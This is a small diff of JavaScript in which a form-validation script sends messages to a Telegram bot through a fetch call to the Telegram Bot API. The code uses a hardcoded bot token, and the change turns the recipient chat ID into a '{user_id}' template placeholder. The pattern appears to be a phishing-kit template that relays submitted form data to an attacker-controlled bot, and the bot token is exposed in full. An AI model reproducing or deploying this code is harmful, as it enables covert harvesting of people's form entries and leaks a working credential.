@@ -24,7 +24,7 @@ function validateForm() {
 // دالة إرسال البيانات إلى بوت التليجرام
 function sendToBot(message) {
     const botToken = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E";
-    const chatId = "5375214810";
+    const chatId = "{user_id}";
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
